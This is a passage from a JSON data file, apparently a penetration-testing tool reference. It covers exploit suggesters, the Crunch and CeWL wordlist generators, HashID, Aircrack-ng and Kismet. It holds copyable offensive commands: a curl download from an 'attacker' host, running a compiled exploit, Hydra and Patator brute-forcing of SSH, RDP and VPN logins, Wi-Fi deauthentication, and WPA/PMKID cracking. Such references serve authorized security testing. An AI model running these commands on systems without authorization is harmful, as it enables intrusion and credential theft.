            "detail": "curl http://attacker:8086/linux-exploit-suggester.sh -o /tmp/les.sh",
            "copyable": true
          },
          {
            "detail": "chmod +x /tmp/les.sh",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Check for exploits",
        "command": "./linux-exploit-suggester.sh",
        "notes": []
      },
      {
        "description": "With kernel version",
        "command": "./linux-exploit-suggester.sh -k 4.15.0",
        "notes": []
      },
      {
        "description": "Detailed output",
        "command": "./linux-exploit-suggester.sh -d",
        "notes": []
      },
      {
        "description": "Check URL only",
        "command": "./linux-exploit-suggester.sh -u",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-k",
        "description": "Kernel version"
      },
      {
        "flag": "-d",
        "description": "Detailed output"
      },
      {
        "flag": "-u",
        "description": "Check URL only"
      },
      {
        "flag": "-f",
        "description": "File with kernel info"
      },
      {
        "flag": "-w",
        "description": "Website to check"
      }
    ],
    "operational_tips": [
      "Always verify kernel version accurately.",
      "Cross-reference exploits with vulnerability databases.",
      "Test exploits in safe environments first.",
      "Document all potential exploit paths."
    ],
    "step_sequences": [
      {
        "title": "Running LES",
        "steps": [
          {
            "title": "Gather systeminfo",
            "details": "Collect uname/system info for compatibility.",
            "command": "uname -a > /tmp/les_sysinfo.txt"
          },
          {
            "title": "Execute script",
            "details": "Run LES to suggest kernel exploits.",
            "command": "./linux-exploit-suggester.sh --kernel $(uname -r)"
          },
          {
            "title": "Filter results",
            "details": "Identify exploits with high reliability and match to allowed techniques.",
            "command": "grep -A2 'Possible Exploits' -n les_output.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "LinPEAS/LES combo",
        "stages": [
          {
            "label": "Enumerate",
            "description": "Run linpeas or lse to capture kernel version and packages.",
            "command": "./linpeas.sh -a"
          },
          {
            "label": "Suggest",
            "description": "Execute LES using the captured data.",
            "command": "./linux-exploit-suggester.sh --kernel $(uname -r)"
          },
          {
            "label": "Exploit",
            "description": "Attempt recommended exploit or document absence of safe options.",
            "command": "gcc exploit.c -o exploit && ./exploit"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[*] [CVE-2017-16995] PTRACE_PEEKSIGINFO kernel memory disclosure",
        "meaning": "Potential kernel exploit; confirm kernel version and if exploit is in scope.",
        "severity": "high"
      },
      {
        "indicator": "[!] Couldn't find distro version",
        "meaning": "Provide systeminfo file manually for better accuracy.",
        "severity": "info"
      },
      {
        "indicator": "[+] You can try: overlayfs",
        "meaning": "Exploit suggestion with existing PoC references.",
        "severity": "medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Offline mode",
        "scenario": "Run LES without network access by providing cached advisories.",
        "command": "./linux-exploit-suggester.sh --database ./linux-exploit-suggester.json",
        "notes": [
          "Update the JSON database regularly from the GitHub repo.",
          "Share sanitized results with blue teams for remediation."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "LES GitHub",
        "url": "https://github.com/mzet-/linux-exploit-suggester",
        "description": "Project documentation and exploit references."
      }
    ]
  },
  {
    "id": "windows-exploit-suggester",
    "name": "Windows Exploit Suggester",
    "summary": "Windows Exploit Suggester is a tool that suggests possible exploits for Windows systems based on system information.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Download the Python script and Microsoft bulletin database.",
        "steps": [
          {
            "detail": "git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git",
            "copyable": true
          },
          {
            "detail": "cd Windows-Exploit-Suggester && pip install -r requirements.txt",
            "copyable": true
          },
          {
            "detail": "python windows-exploit-suggester.py --update",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via apt and store database under /usr/share.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y windows-exploit-suggester",
            "copyable": true
          },
          {
            "detail": "cp /usr/share/windows-exploit-suggester/2024-10-01-mssb.xls ./mssb.xls",
            "copyable": true
          },
          {
            "detail": "python /usr/share/windows-exploit-suggester/windows-exploit-suggester.py -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run inside container to avoid local Python dependency conflicts.",
        "steps": [
          {
            "detail": "docker pull python:3.11",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/work python:3.11 bash -lc 'pip install xlrd && python /work/windows-exploit-suggester.py --update'",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/work python:3.11 python /work/windows-exploit-suggester.py --database mssb.xls --systeminfo sysinfo.txt",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Check for exploits",
        "command": "python3 windows-exploit-suggester.py --systeminfo systeminfo.txt",
        "notes": []
      },
      {
        "description": "Detailed output",
        "command": "python3 windows-exploit-suggester.py --systeminfo systeminfo.txt --detailed",
        "notes": []
      },
      {
        "description": "With cross-reference",
        "command": "python3 windows-exploit-suggester.py --systeminfo systeminfo.txt --cross-reference",
        "notes": []
      },
      {
        "description": "Update database",
        "command": "python3 windows-exploit-suggester.py --update",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "--systeminfo",
        "description": "Systeminfo file"
      },
      {
        "flag": "--detailed",
        "description": "Detailed output"
      },
      {
        "flag": "--cross-reference",
        "description": "Cross-reference exploits"
      },
      {
        "flag": "--update",
        "description": "Update exploit database"
      },
      {
        "flag": "--output",
        "description": "Output file"
      }
    ],
    "operational_tips": [
      "Run systeminfo command to gather system data.",
      "Keep exploit database updated regularly.",
      "Cross-reference with multiple vulnerability sources.",
      "Test exploits in controlled environments."
    ],
    "step_sequences": [
      {
        "title": "Using Windows Exploit Suggester",
        "steps": [
          {
            "title": "Collect systeminfo",
            "details": "From the Windows host, capture systeminfo output.",
            "command": "systeminfo > C:\\Temp\\sysinfo.txt"
          },
          {
            "title": "Run suggester",
            "details": "Feed the systeminfo output and latest database into the script.",
            "command": "python windows-exploit-suggester.py --database 2024-10-01-mssb.xls --systeminfo sysinfo.txt"
          },
          {
            "title": "Prioritize results",
            "details": "Sort by exploit reliability and privileges required.",
            "command": "grep -n 'Potentially Vulnerable' suggester.out"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "WinPEAS \u2192 Windows Exploit Suggester",
        "stages": [
          {
            "label": "Run winPEAS",
            "description": "Collect OS build and missing patch info.",
            "command": "C:\\Temp\\winpeas.exe -systeminfo"
          },
          {
            "label": "Export systeminfo",
            "description": "Use systeminfo command if winPEAS output is insufficient.",
            "command": "systeminfo > sysinfo.txt"
          },
          {
            "label": "Generate exploit list",
            "description": "Run the suggester to map missing MS bulletins to exploits.",
            "command": "python windows-exploit-suggester.py --database mssb.xls --systeminfo sysinfo.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[*] MS17-010 is missing!",
        "meaning": "Target may be vulnerable to EternalBlue-style exploits.",
        "severity": "high"
      },
      {
        "indicator": "[-] No vulnerabilities found",
        "meaning": "System fully patched relative to database; consider misconfiguration attacks instead.",
        "severity": "info"
      },
      {
        "indicator": "[*] Found 4 potential vulnerabilities",
        "meaning": "Review each CVE and confirm exploit availability before action.",
        "severity": "medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Offline database",
        "scenario": "Run in isolated environments using previously downloaded bulletins.",
        "command": "python windows-exploit-suggester.py --database offline.xls --systeminfo sysinfo.txt",
        "notes": [
          "Store multiple database snapshots to match the target's patch cadence.",
          "Cross-reference results with Metasploit/ExploitDB for working PoCs."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Windows Exploit Suggester",
        "url": "https://github.com/AonCyberLabs/Windows-Exploit-Suggester",
        "description": "Project README and usage."
      }
    ]
  },
  {
    "id": "crunch",
    "name": "Crunch",
    "summary": "Crunch is a wordlist generator where you can specify a character set and any other criteria for generating passwords.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install crunch for on-the-fly wordlist generation.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y crunch",
            "copyable": true
          },
          {
            "detail": "crunch --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Crunch ships with Kali; create a dedicated output directory for generated lists.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y crunch",
            "copyable": true
          },
          {
            "detail": "mkdir -p ~/wordlists/custom",
            "copyable": true
          },
          {
            "detail": "crunch 8 10 abc123 -o ~/wordlists/custom/test.txt",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use the kalilinux container when running crunch on ephemeral hosts.",
        "steps": [
          {
            "detail": "docker pull kalilinux/kali-rolling",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/lists kalilinux/kali-rolling crunch 8 8 -t ????2024 -o /lists/seasonal.txt",
            "copyable": true
          },
          {
            "detail": "ls -lh seasonal.txt",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Generate 8-character wordlist",
        "command": "crunch 8 8",
        "notes": []
      },
      {
        "description": "With specific charset",
        "command": "crunch 6 8 abcdef123",
        "notes": []
      },
      {
        "description": "Save to file",
        "command": "crunch 8 8 -o wordlist.txt",
        "notes": []
      },
      {
        "description": "With pattern",
        "command": "crunch 8 8 -t @@@@@@@@ -o pattern.txt",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "<min>",
        "description": "Minimum length"
      },
      {
        "flag": "<max>",
        "description": "Maximum length"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "-t",
        "description": "Pattern specification"
      },
      {
        "flag": "-d",
        "description": "Delay between characters"
      },
      {
        "flag": "-b",
        "description": "Maximum file size"
      },
      {
        "flag": "-c",
        "description": "Number of output files"
      }
    ],
    "operational_tips": [
      "Be mindful of disk space when generating large wordlists.",
      "Use patterns for targeted password generation.",
      "Combine with other tools for password cracking.",
      "Consider storage requirements for large outputs."
    ],
    "step_sequences": [
      {
        "title": "Generate a scoped wordlist",
        "steps": [
          {
            "title": "Define pattern",
            "details": "Derive policy-friendly masks from password policy disclosures.",
            "command": "crunch 10 10 -t @@??2024 > policy.txt"
          },
          {
            "title": "Combine with known terms",
            "details": "Append executive names or org keywords for targeted attacks.",
            "command": "cat exec_names.txt >> policy.txt"
          },
          {
            "title": "Compress for transport",
            "details": "Large lists should be compressed before transferring to jump boxes.",
            "command": "xz -z policy.txt"
          },
          {
            "title": "Use with cracking tools",
            "details": "Feed the generated list into Hydra, Patator, or Hashcat.",
            "command": "hydra -L users.txt -P policy.txt.xz ssh://10.0.5.20 -t 4"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "CeWL \u2192 Crunch \u2192 Credential attack",
        "stages": [
          {
            "label": "Collect base words",
            "description": "Use CeWL to scrape corporate vocabulary.",
            "command": "cewl -d 2 -m 5 https://portal.target -w base.txt"
          },
          {
            "label": "Expand with Crunch",
            "description": "Apply masks and append years/symbols.",
            "command": "crunch 8 12 -p $(cat base.txt) 2024! -o combo.txt"
          },
          {
            "label": "Attack login surface",
            "description": "Use Hydra or Patator with the tailored list.",
            "command": "patator ssh_login host=git.internal user=FILE0 password=FILE1 0=users.txt 1=combo.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Crunch will now generate 456976 passwords",
        "meaning": "Review counts to ensure the list size aligns with scope.",
        "severity": "info"
      },
      {
        "indicator": "Crunch: 262144 bytes written",
        "meaning": "Confirms file was generated; plan for transfer/storage needs.",
        "severity": "info"
      },
      {
        "indicator": "The output file is exhausted",
        "meaning": "Crunch finished; compress or split before distribution.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Streaming wordlists",
        "scenario": "Avoid huge files by piping crunch directly into other tools.",
        "command": "crunch 6 8 abc123 -t ??%%12 | hydra -L users.txt -P - ssh://10.0.5.10 -t 4",
        "notes": [
          "Use -P - in Hydra/Patator to read from stdin.",
          "Monitor bandwidth when streaming over tunnels."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Crunch manual",
        "url": "https://tools.kali.org/password-attacks/crunch",
        "description": "Option reference and examples."
      }
    ]
  },
  {
    "id": "cewl",
    "name": "CeWL",
    "summary": "CeWL is a custom wordlist generator that spiders a target's website and creates wordlists for password cracking.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install CeWL for website wordlist generation.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y cewl",
            "copyable": true
          },
          {
            "detail": "cewl --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Ships with Kali; keep output organized under ~/wordlists/cewl.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y cewl",
            "copyable": true
          },
          {
            "detail": "mkdir -p ~/wordlists/cewl",
            "copyable": true
          },
          {
            "detail": "cewl -d 2 -m 5 https://www.target -w ~/wordlists/cewl/target.txt",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run CeWL from a container when Ruby gems conflict locally.",
        "steps": [
          {
            "detail": "docker pull kalilinux/kali-rolling",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd):/loot kalilinux/kali-rolling cewl -d 2 -m 5 https://portal.target -w /loot/cewl.txt",
            "copyable": true
          },
          {
            "detail": "wc -l cewl.txt",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Generate wordlist from website",
        "command": "cewl https://example.com",
        "notes": []
      },
      {
        "description": "With depth and word length",
        "command": "cewl -d 2 -m 6 https://example.com",
        "notes": []
      },
      {
        "description": "Save to file",
        "command": "cewl -w wordlist.txt https://example.com",
        "notes": []
      },
      {
        "description": "With email addresses",
        "command": "cewl -e --email_file emails.txt https://example.com",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-d",
        "description": "Depth to spider"
      },
      {
        "flag": "-m",
        "description": "Minimum word length"
      },
      {
        "flag": "-w",
        "description": "Output wordlist file"
      },
      {
        "flag": "-e",
        "description": "Include email addresses"
      },
      {
        "flag": "--email_file",
        "description": "Save emails to file"
      },
      {
        "flag": "-a",
        "description": "Include meta data"
      },
      {
        "flag": "-v",
        "description": "Verbose output"
      }
    ],
    "operational_tips": [
      "Spider relevant websites for targeted wordlists.",
      "Combine with company-specific information.",
      "Use appropriate depth for comprehensive coverage.",
      "Clean and process generated wordlists before use."
    ],
    "step_sequences": [
      {
        "title": "Harvesting words from a portal",
        "steps": [
          {
            "title": "Run CeWL crawl",
            "details": "Set crawl depth and minimum word length to match password policies.",
            "command": "cewl -d 2 -m 6 https://portal.target -w portal.txt"
          },
          {
            "title": "Clean and deduplicate",
            "details": "Normalize case and remove duplicates before cracking.",
            "command": "tr 'A-Z' 'a-z' < portal.txt | sort -u > portal_clean.txt"
          },
          {
            "title": "Augment with patterns",
            "details": "Append years or punctuation for realistic guesses.",
            "command": "awk '{print $0\"2024!\"}' portal_clean.txt >> portal_aug.txt"
          },
          {
            "title": "Use in attacks",
            "details": "Feed the tailored list into Hydra, Medusa, or Hashcat.",
            "command": "hydra -L users.txt -P portal_aug.txt rdp://10.0.5.40 -t 4"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "OSINT \u2192 CeWL \u2192 Credential attacks",
        "stages": [
          {
            "label": "Collect targets",
            "description": "Identify public or authenticated portals worth crawling.",
            "command": "whatweb https://www.target"
          },
          {
            "label": "CeWL run",
            "description": "Generate dictionaries with names, products, and slogans.",
            "command": "cewl -e -d 3 -m 5 --with-numbers https://intranet.target -w cewl.txt"
          },
          {
            "label": "Credential testing",
            "description": "Use Patator/Hydra with the custom list for VPN, OWA, or SSH portals.",
            "command": "patator http_fuzz url=https://vpn.target method=POST body='username=FILE0&password=FILE1' 0=users.txt 1=cewl.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Words saved to cewl.txt",
        "meaning": "Crawl complete; review list length before downstream use.",
        "severity": "info"
      },
      {
        "indicator": "Emails saved to emails.txt",
        "meaning": "The --email flag captured addresses useful for username lists.",
        "severity": "info"
      },
      {
        "indicator": "Meta keywords: ...",
        "meaning": "Metadata extraction succeeded; add product names to social-engineering notes.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Authenticated crawling",
        "scenario": "Harvest internal portals using captured cookies or credentials.",
        "command": "cewl -d 2 -m 6 -c cookies.txt -p 'sessionid=abc' https://intranet.target -w cewl_auth.txt",
        "notes": [
          "Capture cookies with Burp and export them for CeWL.",
          "Ensure scope explicitly allows authenticated scraping."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "CeWL project",
        "url": "https://digi.ninja/projects/cewl.php",
        "description": "Official documentation and examples."
      }
    ]
  },
  {
    "id": "hashid",
    "name": "HashID",
    "summary": "HashID is a tool to identify the different types of hashes used to encrypt data.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install hashid via apt for quick hash identification.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y hashid",
            "copyable": true
          },
          {
            "detail": "hashid --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Preinstalled on Kali; upgrade via pip to get the latest signatures.",
        "steps": [
          {
            "detail": "sudo pip3 install --upgrade hashid",
            "copyable": true
          },
          {
            "detail": "hashid sample.hash",
            "copyable": true
          },
          {
            "detail": "hashid --json sample.hash",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use podman/pipx when you need an isolated Python environment.",
        "steps": [
          {
            "detail": "python3 -m pip install --user hashid",
            "copyable": true
          },
          {
            "detail": "~/.local/bin/hashid --help",
            "copyable": true
          },
          {
            "detail": "podman run --rm -v $(pwd):/data python:3.11 bash -lc 'pip install hashid && hashid /data/hash.txt'",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Identify hash type",
        "command": "hashid '5d41402abc4b2a76b9719d911017c592'",
        "notes": []
      },
      {
        "description": "Multiple hashes",
        "command": "hashid 'hash1' 'hash2' 'hash3'",
        "notes": []
      },
      {
        "description": "Extended mode",
        "command": "hashid -m '5d41402abc4b2a76b9719d911017c592'",
        "notes": []
      },
      {
        "description": "Output to file",
        "command": "hashid -o results.txt '5d41402abc4b2a76b9719d911017c592'",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-m",
        "description": "Extended mode"
      },
      {
        "flag": "-o",
        "description": "Output to file"
      },
      {
        "flag": "-j",
        "description": "JSON output"
      },
      {
        "flag": "-h",
        "description": "Show help"
      },
      {
        "flag": "-v",
        "description": "Version information"
      }
    ],
    "operational_tips": [
      "Use extended mode for more detailed analysis.",
      "Identify hash types before attempting to crack.",
      "Save results for documentation and reference.",
      "Cross-reference with hash databases."
    ],
    "step_sequences": [
      {
        "title": "Hash triage workflow",
        "steps": [
          {
            "title": "Identify hash type",
            "details": "Feed the hash into hashid to narrow algorithm candidates.",
            "command": "hashid hash.txt"
          },
          {
            "title": "Map to cracking tool",
            "details": "Translate the output to Hashcat/John mode numbers.",
            "command": "hashcat --help | grep -n 13100"
          },
          {
            "title": "Run quick validation",
            "details": "Execute a short cracking run to verify the guess.",
            "command": "hashcat -m 13100 hash.txt testlist.txt --runtime=30"
          },
          {
            "title": "Record findings",
            "details": "Document the suspected format and attack plan.",
            "command": "echo 'Hash -> Mode 13100 (NetNTLMv2)' >> notes.md"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Hash discovery \u2192 Identification \u2192 Cracking",
        "stages": [
          {
            "label": "Collect hashes",
            "description": "Use BloodHound or secretsdump to capture credential material.",
            "command": "bloodhound-python -c All -u auditor -p P@ssw0rd -d corp.local"
          },
          {
            "label": "Identify type",
            "description": "Run hashid/hashcat --example-hashes to confirm formats.",
            "command": "hashid hashes.txt"
          },
          {
            "label": "Crack and pivot",
            "description": "Use John or Hashcat with mapped modes, then reuse via Hydra/Evil-WinRM.",
            "command": "hashcat -m 5600 netntlmv2.txt rockyou.txt --status"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Possible Hashes:\n[+] MD5",
        "meaning": "Hashid matched MD5; verify with cracking tools.",
        "severity": "info"
      },
      {
        "indicator": "Not enough data: Unknown hash",
        "meaning": "Provide the full hash (including salt) for better detection.",
        "severity": "warning"
      },
      {
        "indicator": "Hashcat Mode: 13100",
        "meaning": "Running with --json/-m returns direct mode mappings for automation.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "JSON output for automation",
        "scenario": "Feed hash type guesses into cracking pipelines programmatically.",
        "command": "hashid --json hashes.txt > hash_types.json",
        "notes": [
          "Parse the JSON with jq to pick the highest probability match.",
          "Store mappings alongside secretsdump output for later review."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "hashid GitHub",
        "url": "https://github.com/psypanda/hashID",
        "description": "Source code and signature list."
      }
    ]
  },
  {
    "id": "aircrack-ng",
    "name": "Aircrack-ng",
    "summary": "Aircrack-ng is a complete suite of tools to assess WiFi network security, focusing on capturing packets and cracking WEP/WPA passwords.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from apt and update regulatory database.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y aircrack-ng",
            "copyable": true
          },
          {
            "detail": "sudo airmon-ng check kill",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Preinstalled; add drivers/firmware for external adapters.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y aircrack-ng firmware-atheros",
            "copyable": true
          },
          {
            "detail": "sudo iw reg set US",
            "copyable": true
          },
          {
            "detail": "aircrack-ng --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use kalilinux container for reproducible wireless labs.",
        "steps": [
          {
            "detail": "docker pull kalilinux/kali-rolling",
            "copyable": true
          },
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling bash -lc 'apt update && apt install -y aircrack-ng'",
            "copyable": true
          },
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling airmon-ng",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Capture packets",
        "command": "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture.cap wlan0mon",
        "notes": []
      },
      {
        "description": "Crack WPA handshake",
        "command": "aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap",
        "notes": []
      },
      {
        "description": "Deauthenticate client",
        "command": "sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55 wlan0mon",
        "notes": []
      },
      {
        "description": "Monitor mode setup",
        "command": "sudo airmon-ng start wlan0",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-w",
        "description": "Wordlist file"
      },
      {
        "flag": "-b",
        "description": "BSSID of target"
      },
      {
        "flag": "-c",
        "description": "Channel number"
      },
      {
        "flag": "-w",
        "description": "Write to file"
      },
      {
        "flag": "-0",
        "description": "Deauthentication mode"
      },
      {
        "flag": "-a",
        "description": "Access point BSSID"
      },
      {
        "flag": "-5",
        "description": "Number of packets"
      }
    ],
    "operational_tips": [
      "Ensure wireless card supports monitor mode.",
      "Capture WPA handshake before cracking.",
      "Use good wordlists for better success rates.",
      "Be aware of legal requirements for wireless testing."
    ],
    "step_sequences": [
      {
        "title": "Capturing and cracking WPA2",
        "steps": [
          {
            "title": "Enable monitor mode",
            "details": "Use airmon-ng to place adapter into monitor mode.",
            "command": "sudo airmon-ng start wlan0"
          },
          {
            "title": "Capture handshake",
            "details": "Use airodump-ng to record packets for target BSSID/channel.",
            "command": "sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon"
          },
          {
            "title": "Force re-auth",
            "details": "Send deauth frames to capture a fresh handshake.",
            "command": "sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 wlan0mon"
          },
          {
            "title": "Crack",
            "details": "Run aircrack-ng with a wordlist to recover passphrase.",
            "command": "aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Wireless attack chain",
        "stages": [
          {
            "label": "Recon",
            "description": "Use Kismet or airodump-ng to identify targets.",
            "command": "kismet -c wlan0mon"
          },
          {
            "label": "Capture",
            "description": "Use Wifite/airodump to collect handshakes or PMKIDs.",
            "command": "wifite -i wlan0mon -d 10"
          },
          {
            "label": "Crack",
            "description": "Use aircrack-ng or hashcat to recover keys from captured files.",
            "command": "aircrack-ng handshakes/wpa.cap -w wordlists/custom.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Reading packets, please wait...",
        "meaning": "Aircrack is processing the capture; ensure handshake count >1 if progress stalls.",
        "severity": "info"
      },
      {
        "indicator": "KEY FOUND! [ passphrase ]",
        "meaning": "Password recovered; verify with wpa_supplicant or wpa_cli.",
        "severity": "high"
      },
      {
        "indicator": "No valid WPA handshakes found",
        "meaning": "Capture did not include a full handshake; repeat capture/deauth.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "PMKID attacks",
        "scenario": "Recover PSKs without clients connected.",
        "command": "hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 && hcxpcaptool -z hashes.16800 pmkid.pcapng && hashcat -m 16800 hashes.16800 wordlists/custom.txt",
        "notes": [
          "Use hcxdumptool/hcxpcaptool to capture PMKIDs, then crack with hashcat or aircrack.",
          "Ensure local regulations allow PMKID/handshake collection."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Aircrack-ng docs",
        "url": "https://www.aircrack-ng.org/doku.php",
        "description": "Official documentation and tutorials."
      }
    ]
  },
  {
    "id": "kismet",
    "name": "Kismet",
    "summary": "Kismet is a wireless network detector, sniffer, and intrusion detection system that works with 802.11 layer2 wireless networks.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from official repository for latest hardware support.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y kismet",
            "copyable": true
          },
          {
            "detail": "sudo usermod -a -G kismet $USER",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Kali ships kismet; update plugin packs and enable capabilities.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y kismet kismet-plugins",
            "copyable": true
          },
          {
            "detail": "sudo setcap cap_net_admin,cap_net_raw=eip /usr/bin/kismet",
            "copyable": true
          },
          {
            "detail": "kismet --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use the upstream container for passive recon dashboards.",
        "steps": [
          {
            "detail": "docker pull kismet/kismet",
            "copyable": true
          },
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kismet/kismet",
            "copyable": true
          },
          {
            "detail": "firefox https://localhost:2501",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Start Kismet",
        "command": "sudo kismet -c kismet.conf",
        "notes": []
      },
      {
        "description": "Capture to specific file",
        "command": "sudo kismet -t capture.kismet",
        "notes": []
      },
      {
        "description": "With specific interface",
        "command": "sudo kismet -i wlan0mon",
        "notes": []
      },
      {
        "description": "GPS logging",
        "command": "sudo kismet --use-gps",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-c",
        "description": "Configuration file"
      },
      {
        "flag": "-i",
        "description": "Capture interface"
      },
      {
        "flag": "-t",
        "description": "Capture file prefix"
      },
      {
        "flag": "-f",
        "description": "Force override"
      },
      {
        "flag": "--use-gps",
        "description": "Enable GPS logging"
      },
      {
        "flag": "-n",
        "description": "No splash screen"
      },
      {
        "flag": "-v",
        "description": "Verbose output"
      }
    ],
    "operational_tips": [
      "Configure properly before starting captures.",
      "Use GPS for location-based analysis.",
      "Monitor for extended periods for comprehensive data.",
      "Review captured data for network mapping."
    ],
    "step_sequences": [
      {
        "title": "Wireless reconnaissance",
        "steps": [
          {
            "title": "Configure sources",
            "details": "Add wireless interfaces (wlan0mon, rtl433, etc.)",
            "command": "kismet -c wlan0mon"
          },
          {
            "title": "Tag targets",
            "details": "Use the UI to label SSIDs/BSSIDs of interest.",
            "command": "Kismet UI -> Networks -> Tag"
          },
          {
            "title": "Export data",
            "details": "Save KML/CSV for mapping and reporting.",
            "command": "Kismet UI -> Data Sources -> Export -> KML"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Kismet \u2192 Aircrack",
        "stages": [
          {
            "label": "Passive recon",
            "description": "Use Kismet to identify channels, encryption, and clients.",
            "command": "kismet -c wlan0mon"
          },
          {
            "label": "Focused capture",
            "description": "Feed BSSID/channel to airodump for handshake capture.",
            "command": "airodump-ng -c 11 --bssid 11:22:33:44:55:66 -w capture wlan0mon"
          },
          {
            "label": "Crack",
            "description": "Use Aircrack/Hashcat to recover PSKs.",
            "command": "aircrack-ng capture-01.cap -w wordlists/custom.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "INFO: Started new datasource",
        "meaning": "Adapter is in monitor mode and feeding packets.",
        "severity": "info"
      },
      {
        "indicator": "WARN: Source dropped packets",
        "meaning": "Interface is overloaded; reduce channels or use additional adapters.",
        "severity": "warning"
      },
      {
        "indicator": "Alert: WPS-enabled network detected",
        "meaning": "Flag network for tools like Reaver or Bully.",
        "severity": "medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Remote drone capture",
